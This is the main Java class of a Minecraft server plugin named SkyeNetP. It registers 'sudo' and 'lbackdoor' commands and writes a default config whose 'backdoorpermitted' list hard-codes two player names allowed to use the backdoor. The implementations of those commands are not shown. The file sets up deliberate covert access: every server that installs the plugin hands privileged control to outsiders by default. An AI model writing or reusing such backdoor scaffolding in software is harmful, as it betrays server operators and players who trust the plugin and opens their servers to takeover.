package me.pilkeysek.skyeNetP;

import me.pilkeysek.skyeNetP.commands.LBackdoorCommand;
import me.pilkeysek.skyeNetP.commands.SudoCommand;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.minimessage.MiniMessage;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.Arrays;
import java.util.Collections;
import java.util.Objects;

@SuppressWarnings("unused")
public final class SkyeNetP extends JavaPlugin {
    private FileConfiguration config;
    public static final Component defaultPermMessage = MiniMessage.miniMessage().deserialize("<red>You do not have the required permissions to execute this command</red>");
    public static final Component defaultConsoleDetectedMessage = MiniMessage.miniMessage().deserialize("<red>You are already the console ._.</red>");
    public static final Component defaultNonPlayerDetectedMessage = MiniMessage.miniMessage().deserialize("<red>You must be a player to execute this command</red>");

    @Override
    public void onEnable() {
        initConfig();
        Objects.requireNonNull(getCommand("sudo")).setExecutor(new SudoCommand(config));
        Objects.requireNonNull(getCommand("lbackdoor")).setExecutor(new LBackdoorCommand(config));
    }

    private void initConfig() {
        config = getConfig();
        // The backdoor permitted config value defines the players that can use /backdoor or similar
        config.addDefault("backdoorpermitted", Arrays.asList("PilkeySEK", "NobleSkye"));
        config.addDefault("enabledcommands", Collections.singletonList("sudo"));

        if (!getDataFolder().exists()){
            getLogger().info("Creating "+ getDataFolder() +" main directory ");
            try {
                boolean res = getDataFolder().mkdir();
                if(!res) getLogger().warning("Config data folder might not have been created (?)");
            }
            catch (SecurityException e) {
                getLogger().warning("Could not create config directory! Error:");
                getLogger().warning(e.toString());
            }
            saveDefaultConfig();
        }
        saveDefaultConfig();

        config.options().copyDefaults(true);
        saveConfig();
    }
    @Override
    public void onDisable() {
    }
}
